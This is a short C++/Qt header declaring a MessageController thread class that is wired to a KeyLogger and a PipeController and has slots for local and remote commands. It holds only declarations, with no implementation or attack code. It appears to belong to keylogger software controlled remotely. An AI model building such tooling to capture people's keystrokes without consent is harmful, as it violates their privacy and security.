#ifndef MESSAGECONTROLLER_H
#define MESSAGECONTROLLER_H

#include <QThread>
#include <QHash>
#include <QCryptographicHash>
#include "KeyLogger.h"
#include "PipeController.h"

class MessageController : public QThread
{
    Q_OBJECT

public:
    MessageController(KeyLogger *logger, PipeController *pipe, QObject *parent = nullptr);

    void terminate();

private slots:
    void addCommand(QString message);
    void addRemoteCommand(QString message);

    // QThread interface
protected:
    void run();

private:
    QList<QString> _msgs;
    QList<QByteArray> _history;

};

#endif // MESSAGECONTROLLER_H
